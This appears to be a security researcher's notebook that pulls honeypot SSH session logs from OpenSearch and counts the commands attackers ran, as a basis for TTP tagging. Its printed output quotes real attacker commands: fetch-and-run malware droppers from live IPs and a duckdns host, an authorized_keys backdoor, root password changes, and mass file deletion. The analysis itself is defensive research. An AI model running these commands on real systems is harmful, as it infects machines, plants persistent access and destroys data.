# %% [markdown]
# # TTP tagging on commands
# #### (based on GroupTracer paper)

# %%
#import IP_address_filter
#import SG_IP_matching
#import xml_to_csv
import VT_API
import OS_API
import pandas as pd
import numpy as np
from datetime import datetime
import time
import os
from tqdm import tqdm
import json
import re
import csv

# %%
#columns of interest
COLS = ['peerIP',
        'peerPort',
        'hostIP',
        'hostPort',
        'commands',
        'hashes',
        'urls',
        'loggedin',
        'startTime',
        'endTime',
        'sort_num',
        'peerCountry',
        'hostCountry'
       ]

SIZE = 10000

# %%
defaultquery = [{"range": {
                "startTime": {
                  "gte": "now-1d",
                  "lte": "now",
                  "format": "strict_date_optional_time"
                }}},
                {"exists": {"field": "commands"}}
               ]

# %%
size = 10000 #batch size, max 10000
search_after = [0]
df_os = pd.DataFrame(columns=COLS)

queryls = defaultquery
print(queryls)

total = 0

while (size == SIZE):
    print(f"Continue from record: {search_after}")
    data = OS_API.opensearch_request(size,queryls,search_after)
    df_os = pd.concat([df_os,data])
    
    #update params
    size = len(data) #exit once it completes last batch
    total+=size #update total records number
    print(f'Current total: {total}')
    search_after = data['sort_num'][len(data)-1] #update sort number to continue after
    #time.sleep(1)
    
print(f'Done. Total records: {total}')
# Out:
# [{'range': {'startTime': {'gte': 'now-1d', 'lte': 'now', 'format': 'strict_date_optional_time'}}}, {'exists': {'field': 'commands'}}]
# Continue from record: [0]
# <Response [200]>
# Output success
# Current total: 10000
# Continue from record: [1667186493966]
# <Response [200]>
# Output success
# Current total: 20000
# Continue from record: [1667190584878]
# <Response [200]>
# Output success
# Current total: 30000
# Continue from record: [1667194981589]
# <Response [200]>
# Output success
# Current total: 40000
# Continue from record: [1667198909575]
# <Response [200]>
# Output success
# Current total: 50000
# Continue from record: [1667202132770]
# <Response [200]>
# Output success
# Current total: 60000
# Continue from record: [1667205427011]
# <Response [200]>
# Output success
# Current total: 70000
# Continue from record: [1667209235870]
# <Response [200]>
# Output success
# Current total: 80000
# Continue from record: [1667212113865]
# <Response [200]>
# Output success
# Current total: 90000
# Continue from record: [1667215101100]
# <Response [200]>
# Output success
# Current total: 100000
# Continue from record: [1667218239994]
# <Response [200]>
# Output success
# Current total: 110000
# Continue from record: [1667221676281]
# <Response [200]>
# Output success
# Current total: 120000
# Continue from record: [1667224983815]
# <Response [200]>
# Output success
# Current total: 130000
# Continue from record: [1667228168769]
# <Response [200]>
# Output success
# Current total: 140000
# Continue from record: [1667231172025]
# <Response [200]>
# Output success
# Current total: 150000
# Continue from record: [1667234776996]
# <Response [200]>
# Output success
# Current total: 160000
# Continue from record: [1667238373835]
# <Response [200]>
# Output success
# Current total: 170000
# Continue from record: [1667242217308]
# <Response [200]>
# Output success
# Current total: 180000
# Continue from record: [1667246363967]
# <Response [200]>
# Output success
# Current total: 190000
# Continue from record: [1667250821159]
# <Response [200]>
# Output success
# Current total: 200000
# Continue from record: [1667255705950]
# <Response [200]>
# Output success
# Current total: 210000
# Continue from record: [1667260330251]
# <Response [200]>
# Output success
# Current total: 220000
# Continue from record: [1667265237971]
# <Response [200]>
# Output success
# Current total: 230000
# Continue from record: [1667270040585]
# <Response [200]>
# Output success
# Current total: 231996
# Done. Total records: 231996

# %%
df_os = df_os.reset_index(drop=True)
df_os
# Out:
#                  peerIP peerPort          hostIP hostPort  \
# 0          18.190.97.21    60106  185.158.249.65       22
# 1          18.190.97.21    60116  185.158.249.65       22
# 2          18.190.97.21    60126  185.158.249.65       22
# 3          164.92.86.56    32880  151.236.18.107       22
# 4           197.85.7.12    38936     95.85.78.31       22
# ...                 ...      ...             ...      ...
# 231991     45.158.158.6    35498  141.98.212.126       22
# 231992    27.112.79.217    36420  103.162.98.121       22
# 231993   43.135.125.174     8464    45.138.84.38       22
# 231994    23.224.233.87    40766   45.120.156.46       22
# 231995  103.152.101.235    43992   5.188.133.229       22
#
#                                                  commands  \
# 0                                    [echo -e "\x6F\x6B"]
# 1                                    [echo -e "\x6F\x6B"]
# 2                                    [echo -e "\x6F\x6B"]
# 3                                    [echo -e "\x6F\x6B"]
# 4                                    [echo -e "\x6F\x6B"]
# ...                                                   ...
# 231991                               [echo -e "\x6F\x6B"]
# 231992  [cat /proc/cpuinfo | grep name | wc -l, echo "...
# 231993  [cat /proc/cpuinfo | grep name | wc -l, echo "...
# 231994  [cat /proc/cpuinfo | grep name | wc -l, echo "...
# 231995                               [echo -e "\x6F\x6B"]
#
#                                                    hashes urls  \
# 0                                                      []   []
# 1                                                      []   []
# 2                                                      []   []
# 3                                                      []   []
# 4                                                      []   []
# ...                                                   ...  ...
# 231991                                                 []   []
# 231992  [a8460f446be540410004b1a8db4083773fa46f7fe76fa...   []
# 231993  [a8460f446be540410004b1a8db4083773fa46f7fe76fa...   []
# 231994  [a8460f446be540410004b1a8db4083773fa46f7fe76fa...   []
# 231995                                                 []   []
#
#                  loggedin                    startTime  \
# 0        [root, handyman]  2022-10-31T02:34:38.772705Z
# 1         [root, hampton]  2022-10-31T02:34:40.769635Z
# 2        [root, doghouse]  2022-10-31T02:34:42.596351Z
# 3        [root, 19830424]  2022-10-31T02:34:39.253216Z
# 4          [root, durdur]  2022-10-31T02:34:41.285631Z
# ...                   ...                          ...
# 231991  [root, nihao123!]  2022-11-01T02:49:56.354185Z
# 231992    [root, suporte]  2022-11-01T02:49:51.076936Z
# 231993  [root, Abcabc123]  2022-11-01T02:49:49.481268Z
# 231994     [root, 123asd]  2022-11-01T02:49:52.350612Z
# 231995   [root, 19830611]  2022-11-01T02:50:06.527079Z
#
#                             endTime         sort_num peerCountry hostCountry
# 0       2022-10-31T02:34:40.567490Z  [1667183680682]          US          NL
# 1       2022-10-31T02:34:42.417180Z  [1667183682585]          US          NL
# 2       2022-10-31T02:34:44.131199Z  [1667183684198]          US          NL
# 3       2022-10-31T02:34:44.664230Z  [1667183684787]          US          IT
# 4       2022-10-31T02:34:45.507900Z  [1667183685577]          ZA          RU
# ...                             ...              ...         ...         ...
# 231991  2022-11-01T02:50:08.315839Z  [1667271008430]          DE          HK
# 231992  2022-11-01T02:50:08.727525Z  [1667271008821]          ID         NaN
# 231993  2022-11-01T02:50:09.457790Z  [1667271009524]          JP          US
# 231994  2022-11-01T02:50:09.969191Z  [1667271010081]          US          HK
# 231995  2022-11-01T02:50:10.311935Z  [1667271010377]         NaN          ZA
#
# [231996 rows x 13 columns]

# %%
#df_os.to_csv("OS_pull" + "_" + str(datetime.now().strftime('%Y_%m_%d_%H_%M_%S')) + ".csv", index=False)

# %%
commandls = []
index = []

for i,row in df_os.iterrows():
    for c in row['commands']:
        try:
            #regex to find url starting with http(s)
            found = re.findall("https?:\\/\\/(?:www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}\\.[a-zA-Z0-9()]{1,6}\\b(?:[/]*)", c)
            #print(i, found)

            for f in found:
                if f not in commandls:
                    commandls.append(f)

        except AttributeError:
            print(i, 'No matches found')
            found = ''

# %%
commandls
# Out:
# ['http://45.85.190.246/',
#  'http://37.44.238.150/',
#  'http://45.95.169.36/',
#  'http://34.125.23.21/',
#  'http://192.168.1.1',
#  'http://amkbins.duckdns.org/',
#  'http://125.27.179.36/',
#  'http://92.207.203.157/',
#  'http://194.26.229.35/',
#  'http://52.67.77.33/',
#  'http://94.43.10.249',
#  'http://176.223.139.141/',
#  'http://58.255.13.215',
#  'http://27.43.108.252',
#  'http://119.195.226.183',
#  'http://92.87.6.205/',
#  'http://199.192.25.146/',
#  'http://209.141.54.71/',
#  'http://27.45.117.14',
#  'http://163.179.217.252',
#  'http://180.115.155.30',
#  'http://54.94.40.184/',
#  'http://163.179.167.176',
#  'http://147.78.12.197/',
#  'http://207.167.64.136/',
#  'http://120.87.59.164',
#  'http://1.246.222.16',
#  'http://163.204.223.57',
#  'http://79.137.202.122/',
#  'http://124.70.7.7/',
#  'http://60.177.119.140',
#  'https://raw.githubusercontent.com/',
#  'http://37.44.238.234/',
#  'http://45.95.55.214/',
#  'http://109.206.241.34/',
#  'http://185.132.53.105/',
#  'http://39.165.53.17',
#  'http://femboy.somebody.hk/',
#  'http://58.218.17.237',
#  'http://1.246.222.43',
#  'http://107.189.7.193',
#  'http://27.45.14.81',
#  'http://163.204.218.157',
#  'http://176.97.210.132',
#  'http://163.125.65.14',
#  'http://114.226.87.113',
#  'http://27.45.119.85',
#  'http://58.255.12.247',
#  'http://1.84.191.59',
#  'http://58.255.140.201']

# %% [markdown]
# ### List of Unique commands

# %%
#count of commands, stored as dic key pair. 
cmdic = {}

for i,row in df_os.iterrows():
    for c in row['commands']:
        if c in cmdic.keys():
            cmdic[c]+=1
        else:
            cmdic[c]=1
cmdic
# Out:
# {'echo -e "\\x6F\\x6B"': 144122,
#  'cat /etc/issue ; cd /tmp; wget http://45.85.190.246/x86; chmod +x x86; ./x86; rm -rf x86': 181,
#  'cat /proc/cpuinfo | grep name | wc -l': 56038,
#  'echo "root:ojAm7ve7TxXc"|chpasswd|bash': 1,
#  "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'": 56152,
#  "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'": 56122,
#  'ls -lh $(which ls)': 56097,
#  'which ls': 56097,
#  'crontab -l': 56061,
#  'w': 56029,
#  'uname -m': 55993,
#  'cat /proc/cpuinfo | grep model | grep name | wc -l': 55946,
#  'top': 55918,
#  'uname': 55876,
#  'uname -a': 65982,
#  'lscpu | grep Model': 55809,
#  'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa  mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~': 55633,
#  'sh': 17227,
#  'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://37.44.238.150/sensi.sh; curl -O http://37.44.238.150/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 37.44.238.150 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 37.44.238.150; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 37.44.238.150 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *': 2609,
#  'echo "root:yOEsRGS1W4kp"|chpasswd|bash': 2,
#  'echo "root:orPCdIfLARkh"|chpasswd|bash': 1,
#  'echo "root:XSAEuGGQkewl"|chpasswd|bash': 1,
#  'echo "root:5NfFmIq0loze"|chpasswd|bash': 3,
#  'echo "root:SMNKSSsNRZw2"|chpasswd|bash': 1,
#  'echo "root:noJ3OXfzjQfg"|chpasswd|bash': 1,
#  'echo "root:dTPE50tKDtMy"|chpasswd|bash': 1,
#  'echo "root:NWc7zGBj2ZKV"|chpasswd|bash': 2,
#  '/ip cloud print': 83,
#  'ifconfig': 81,
#  'cat /proc/cpuinfo': 77,
#  "ps | grep '[Mm]iner'": 77,
#  "ps -ef | grep '[Mm]iner'": 78,
#  'ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*': 77,
#  'echo Hi | cat -n': 77,
#  'echo "root:YuRgcjwuaYjV"|chpasswd|bash': 1,
#  'enable': 5538,
#  'system': 5539,
#  'shell': 5763,
#  'cat /proc/mounts; /bin/busybox PATCU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PATCU': 1,
#  'tftp; wget; /bin/busybox PATCU': 1,
#  'dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s': 5314,
#  '/bin/busybox PATCU': 1,
#  'rm .s; exit': 5292,
#  'echo "root:MyPg6OKKmWyS"|chpasswd|bash': 1,
#  'echo "root:RAHm9IgE0Abb"|chpasswd|bash': 1,
#  'echo "root:p5cRBOjxmQKU"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox WPSHB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WPSHB': 1,
#  'tftp; wget; /bin/busybox WPSHB': 1,
#  '/bin/busybox WPSHB': 1,
#  'echo "root:fVBdk2uEt4uS"|chpasswd|bash': 1,
#  'echo "root:sUACKlWAHX8I"|chpasswd|bash': 1,
#  'echo "root:7SQyRLyj1g99"|chpasswd|bash': 1,
#  'echo "root:RHGxMQItRg8S"|chpasswd|bash': 1,
#  'echo "root:blot5o6oXWzF"|chpasswd|bash': 1,
#  'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; find . -name "*" -type f -size -5M -delete; wget -qO- http://45.95.169.36/bins.sh | bash; curl http://45.95.169.36/bins.sh | bash;': 26,
#  'echo "root:uJq8ttBzZE8P"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox SZXZF': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SZXZF': 1,
#  'tftp; wget; /bin/busybox SZXZF': 1,
#  '/bin/busybox SZXZF': 1,
#  'echo "root:4Qo72BBW1ca1"|chpasswd|bash': 1,
#  'echo "root:M1NizfDbVF22"|chpasswd|bash': 3,
#  'echo "root:QHde1vTxzvHs"|chpasswd|bash': 1,
#  'echo "root:rZZMfLzgR7qB"|chpasswd|bash': 1,
#  'echo "root:EKZQgrp8EipG"|chpasswd|bash': 1,
#  'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://34.125.23.21/sensi.sh; curl -O http://34.125.23.21/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 34.125.23.21 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 34.125.23.21; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 34.125.23.21 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf * ': 1196,
#  'echo "root:xt5ftsHuPjay"|chpasswd|bash': 1,
#  'echo "root:jRU09fSuE6KX"|chpasswd|bash': 1,
#  'echo "root:TiL1mo1u6Mqt"|chpasswd|bash': 1,
#  'echo "root:jzmtdbWGogEK"|chpasswd|bash': 3,
#  'echo "root:ZlASHcIbjrm8"|chpasswd|bash': 1,
#  'echo "root:IxwPiMBVuP8i"|chpasswd|bash': 1,
#  'echo "root:iVAPKBncIipa"|chpasswd|bash': 1,
#  'echo "root:AVy2WqBKv1dl"|chpasswd|bash': 1,
#  'echo "root:CIBFP6DluBy8"|chpasswd|bash': 2,
#  'echo "root:dCLNzvHp2Jy6"|chpasswd|bash': 1,
#  'echo "root:OmdWafrFl0du"|chpasswd|bash': 1,
#  'echo "root:xGWcPJcV5YRH"|chpasswd|bash': 3,
#  'echo "root:4DnAZlOHglOJ"|chpasswd|bash': 1,
#  'echo "root:Fbij5600Bo2U"|chpasswd|bash': 1,
#  'echo "root:LOz0C8T9bI2K"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox YKDDU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YKDDU': 1,
#  'tftp; wget; /bin/busybox YKDDU': 1,
#  '/bin/busybox YKDDU': 1,
#  'echo "root:2lkMrs9p9kdv"|chpasswd|bash': 2,
#  'start': 130,
#  'config terminal': 130,
#  'linuxshell': 140,
#  'su': 127,
#  "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\\x45\\x4c\\x46'": 127,
#  "/bin/busybox wget;/bin/busybox echo -ne '\\x45\\x4c\\x46'": 126,
#  "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x65\\x64'": 101,
#  'echo "root:kFYQrAUKeXRj"|chpasswd|bash': 1,
#  'echo "root:mdKRq2HLHCRu"|chpasswd|bash': 2,
#  'echo "root:NXLzgf7gWmzz"|chpasswd|bash': 2,
#  'echo "root:QU11USKG03nU"|chpasswd|bash': 1,
#  'echo "root:eavatrxeYjp0"|chpasswd|bash': 1,
#  'echo "root:Wg2ZpjLKizR5"|chpasswd|bash': 1,
#  'echo "root:IgTxXlYz4AWH"|chpasswd|bash': 1,
#  'echo "root:G6lZi41Nu4d2"|chpasswd|bash': 1,
#  'echo "root:hetkJvyuNjH2"|chpasswd|bash': 1,
#  'echo "root:CrQWFz1aU1fb"|chpasswd|bash': 1,
#  'echo "root:RXD3gDcIYOds"|chpasswd|bash': 1,
#  'echo "root:o8P5XQK5H9SU"|chpasswd|bash': 3,
#  'echo "root:VosVJRNRvKcN"|chpasswd|bash': 2,
#  'echo "root:65twFJo7ewdt"|chpasswd|bash': 2,
#  'echo "root:1dqKeom8hvTQ"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox NZGSJ': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NZGSJ': 1,
#  'tftp; wget; /bin/busybox NZGSJ': 1,
#  '/bin/busybox NZGSJ': 1,
#  'echo "root:GRfeanr0Ipt7"|chpasswd|bash': 1,
#  'echo "root:d7LmTwCBls92"|chpasswd|bash': 1,
#  'echo "root:EWTqGWSsbJRW"|chpasswd|bash': 1,
#  'echo "root:nOccwbCqlU4K"|chpasswd|bash': 1,
#  'echo "root:6wyfOljjKUpy"|chpasswd|bash': 2,
#  'echo "root:fStnT2kFDCCI"|chpasswd|bash': 1,
#  'echo "root:EgHFt9AUxNZ3"|chpasswd|bash': 2,
#  'echo "root:P0afrnKvYpyR"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox ZKLFU': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZKLFU': 1,
#  'tftp; wget; /bin/busybox ZKLFU': 1,
#  '/bin/busybox ZKLFU': 1,
#  'echo "root:Nl0LhZunabqH"|chpasswd|bash': 1,
#  'echo "root:xEVEWDSl6DBH"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox DBBEM': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DBBEM': 1,
#  'tftp; wget; /bin/busybox DBBEM': 1,
#  '/bin/busybox DBBEM': 1,
#  'echo "root:rxLlnnqKEh3y"|chpasswd|bash': 2,
#  'echo "root:gaAxnW1B2Dau"|chpasswd|bash': 1,
#  'echo "root:V3eziVoOF6ao"|chpasswd|bash': 1,
#  'echo "root:Bs3zp7cnkOiQ"|chpasswd|bash': 1,
#  'echo "root:TkCY23gc3h08"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox TZBQK': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TZBQK': 1,
#  'tftp; wget; /bin/busybox TZBQK': 1,
#  '/bin/busybox TZBQK': 1,
#  'echo "root:eAYsizdlMat8"|chpasswd|bash': 1,
#  'echo "root:yXRI37SyIFXF"|chpasswd|bash': 2,
#  'echo "root:rEVMI694w6mg"|chpasswd|bash': 1,
#  'echo "root:C9gwEAWNCt3T"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox VUJSY': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VUJSY': 1,
#  'tftp; wget; /bin/busybox VUJSY': 1,
#  '/bin/busybox VUJSY': 1,
#  'echo "root:5D1EwD7gillO"|chpasswd|bash': 1,
#  'echo "root:3NBF8dDrwD0r"|chpasswd|bash': 1,
#  'echo "root:wKz6lT24KbbI"|chpasswd|bash': 2,
#  'echo "root:ax2Ef7sCpldq"|chpasswd|bash': 1,
#  'echo "root:9GtS6TZYmqVb"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox XFOHC': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XFOHC': 1,
#  'tftp; wget; /bin/busybox XFOHC': 1,
#  '/bin/busybox XFOHC': 1,
#  'cat /proc/mounts; /bin/busybox ESLPW': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ESLPW': 1,
#  'tftp; wget; /bin/busybox ESLPW': 1,
#  '/bin/busybox ESLPW': 1,
#  'echo "root:mA5bxYkhe89X"|chpasswd|bash': 2,
#  'echo "root:zoPhIlUO24jp"|chpasswd|bash': 1,
#  'echo "root:GcJt8ddmGXGg"|chpasswd|bash': 2,
#  'echo "root:BxvtW74SOVvu"|chpasswd|bash': 1,
#  'echo "root:N2I6kYLTegzj"|chpasswd|bash': 2,
#  'echo "root:sxm4ovGbAf3V"|chpasswd|bash': 1,
#  'echo "root:2SlwWDnGR3zd"|chpasswd|bash': 1,
#  'echo "root:K8CuR7HfkDmE"|chpasswd|bash': 2,
#  'echo "root:LL5DUcnsTale"|chpasswd|bash': 1,
#  'echo "root:24Gc1yCqM2xn"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox EPNEA': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EPNEA': 1,
#  'tftp; wget; /bin/busybox EPNEA': 1,
#  '/bin/busybox EPNEA': 1,
#  'echo "root:yi7NKAYkbuxe"|chpasswd|bash': 2,
#  'echo "root:1W6ofM6BFcvC"|chpasswd|bash': 1,
#  'echo "root:1PwQ7pvnDm2C"|chpasswd|bash': 1,
#  'echo "root:3kr9Mwk71M7i"|chpasswd|bash': 1,
#  'echo "root:kxVhECXuZW8m"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox EGJHK': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox EGJHK': 1,
#  'tftp; wget; /bin/busybox EGJHK': 1,
#  '/bin/busybox EGJHK': 1,
#  'echo "root:YJvmXqPruzkG"|chpasswd|bash': 1,
#  'echo "root:HKQFWiWs46lt"|chpasswd|bash': 2,
#  'echo "root:6fLaPcMEgYn5"|chpasswd|bash': 1,
#  'echo "root:6ZePAdMY2inc"|chpasswd|bash': 1,
#  'echo "root:341DoOrM6LWq"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox OKBEI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OKBEI': 1,
#  'tftp; wget; /bin/busybox OKBEI': 1,
#  '/bin/busybox OKBEI': 1,
#  'echo "root:4iLlqilNyKBW"|chpasswd|bash': 1,
#  'echo "root:X7OwomdY2OND"|chpasswd|bash': 1,
#  'echo "root:WEzlAowanY5c"|chpasswd|bash': 1,
#  'echo "root:FKkazdV2z3Vs"|chpasswd|bash': 1,
#  'echo "root:jAww4Wim1jzj"|chpasswd|bash': 1,
#  'echo "root:5NrdotRzNTm2"|chpasswd|bash': 2,
#  'echo "root:bBUQlzT47Lqq"|chpasswd|bash': 4,
#  'echo "root:UIOrfSWcM5Ox"|chpasswd|bash': 1,
#  'echo "root:IgbQGRTBY45z"|chpasswd|bash': 1,
#  'echo "root:S0uNC7KWaGb0"|chpasswd|bash': 1,
#  'echo "root:yaCVTHQcXJbQ"|chpasswd|bash': 1,
#  'echo "root:7RegSFXgSu2a"|chpasswd|bash': 1,
#  'echo "root:wK5W8McPQhqa"|chpasswd|bash': 1,
#  'echo "root:SsdBIcWOY53N"|chpasswd|bash': 1,
#  'echo "root:RVVIGipz0oov"|chpasswd|bash': 1,
#  'echo "root:Z8O5asxfUevA"|chpasswd|bash': 2,
#  'echo "root:hrBgedTBSGTr"|chpasswd|bash': 2,
#  'echo "root:Apy58BK5heBC"|chpasswd|bash': 2,
#  'echo "root:J3pwkZwYtLsd"|chpasswd|bash': 1,
#  'echo "root:ZavXWEHD0mRL"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox YKVVX': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YKVVX': 1,
#  'tftp; wget; /bin/busybox YKVVX': 1,
#  '/bin/busybox YKVVX': 1,
#  'echo "root:6xAeEVI4ghOt"|chpasswd|bash': 1,
#  'echo "root:OIxy9dGcgTHJ"|chpasswd|bash': 2,
#  'echo "root:pA3ZyPp78LDV"|chpasswd|bash': 1,
#  'echo "root:JP6EposnVlll"|chpasswd|bash': 1,
#  'echo "root:LMkaYCLtFP6S"|chpasswd|bash': 1,
#  'echo "root:mURx1Afnb5zd"|chpasswd|bash': 1,
#  'echo "root:sPj380QcI9H0"|chpasswd|bash': 2,
#  'echo "root:vyAVtX5IaoPV"|chpasswd|bash': 1,
#  'echo "root:04rdhXWGndAU"|chpasswd|bash': 1,
#  'echo "root:Zd6zUbYRDjmt"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox ZHULI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZHULI': 1,
#  'tftp; wget; /bin/busybox ZHULI': 1,
#  '/bin/busybox ZHULI': 1,
#  'echo "root:uEa9GCWaXJjj"|chpasswd|bash': 1,
#  'echo "root:zswGAdVR3nHL"|chpasswd|bash': 1,
#  'echo "root:Oyvn4PyXJ2ZY"|chpasswd|bash': 1,
#  'echo "root:wXejhCSZ1QRN"|chpasswd|bash': 1,
#  'echo "root:N1OD75rm0e01"|chpasswd|bash': 1,
#  'echo "root:zGRTDd9n09Xg"|chpasswd|bash': 1,
#  'echo "root:HYxIkuuNlhFA"|chpasswd|bash': 1,
#  'echo "root:jEb10A6B9YMv"|chpasswd|bash': 1,
#  'echo "root:G7OcSrU9TSwB"|chpasswd|bash': 1,
#  'echo "root:91AgWjMzn4mH"|chpasswd|bash': 1,
#  'echo "root:28PaO70k4hI3"|chpasswd|bash': 1,
#  'echo "root:PoI3Lq0921Bt"|chpasswd|bash': 2,
#  'echo "root:WIEhkKs8FOtv"|chpasswd|bash': 1,
#  'echo "root:RnjmzSm40lnr"|chpasswd|bash': 3,
#  'echo "root:NmMPVLqQZMFQ"|chpasswd|bash': 1,
#  'echo "root:bl95Byhm91Jk"|chpasswd|bash': 1,
#  'echo "root:SJuMxbnrfCdI"|chpasswd|bash': 1,
#  'echo "root:kAHKgcP2EPIg"|chpasswd|bash': 1,
#  'echo "root:fUSYyxaobG4x"|chpasswd|bash': 1,
#  'echo "root:6HeoziqFqNnW"|chpasswd|bash': 2,
#  'echo "root:0LftxF5SuMEY"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox AHHZC': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AHHZC': 1,
#  'tftp; wget; /bin/busybox AHHZC': 1,
#  '/bin/busybox AHHZC': 1,
#  'echo "root:azw5LU3Maqlk"|chpasswd|bash': 1,
#  'echo "root:Ar9Bbh39EGBc"|chpasswd|bash': 1,
#  'echo "root:opVA2597YfBd"|chpasswd|bash': 1,
#  'echo "root:2qH25Sll4vML"|chpasswd|bash': 2,
#  'echo "root:NqVHXO8aKWqt"|chpasswd|bash': 2,
#  'echo "root:MxYcwQKZzRyu"|chpasswd|bash': 1,
#  'echo "root:SClsu9LdCCJ8"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox UAMUS': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UAMUS': 1,
#  'tftp; wget; /bin/busybox UAMUS': 1,
#  '/bin/busybox UAMUS': 1,
#  'echo "root:pHgyoPuY5d2o"|chpasswd|bash': 1,
#  'echo "root:ZECwPDSae2WQ"|chpasswd|bash': 1,
#  'echo "root:PQe3KsXSvCAn"|chpasswd|bash': 2,
#  'echo "root:CLTFh2Ho6XUw"|chpasswd|bash': 1,
#  'echo "root:WxSuOdlhigYx"|chpasswd|bash': 2,
#  'echo "root:6OuuL9aPK31Z"|chpasswd|bash': 1,
#  'echo "root:pwQCdSkKym1E"|chpasswd|bash': 1,
#  'echo "root:WqktmlLD3lAH"|chpasswd|bash': 2,
#  'echo "root:AQgeZ2nKC2Hy"|chpasswd|bash': 1,
#  'echo "root:Xj4CBVCnbbFk"|chpasswd|bash': 1,
#  'cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://amkbins.duckdns.org/bins/ascaris.x86; cat ascaris.x86 > meth; chmod +x meth; ./meth ROOTED; history -c': 285,
#  'echo "root:82h5NhUXncQG"|chpasswd|bash': 2,
#  'echo "root:jpUk21AEg01m"|chpasswd|bash': 1,
#  'cat /proc/mounts; /bin/busybox DGCCB': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DGCCB': 1,
#  'tftp; wget; /bin/busybox DGCCB': 1,
#  '/bin/busybox DGCCB': 1,
#  'echo "root:XgHqWi1UFSXl"|chpasswd|bash': 1,
#  'echo "root:RSmfAiiMLJBy"|chpasswd|bash': 1,
#  'echo "root:tbiEhA3aZL7o"|chpasswd|bash': 3,
#  'echo "root:NedySRPwvrVW"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox TFKGA': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TFKGA': 1,
#  'tftp; wget; /bin/busybox TFKGA': 1,
#  '/bin/busybox TFKGA': 1,
#  'echo "root:5XRXG09vSf4V"|chpasswd|bash': 1,
#  'echo "root:O3EptaamEwhI"|chpasswd|bash': 3,
#  'cat /proc/mounts; /bin/busybox KLUQI': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KLUQI': 1,
#  'tftp; wget; /bin/busybox KLUQI': 1,
#  '/bin/busybox KLUQI': 1,
#  'echo "root:lzrfWVk3mb3q"|chpasswd|bash': 2,
#  'cat /proc/mounts; /bin/busybox QAHSV': 1,
#  'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QAHSV': 1,
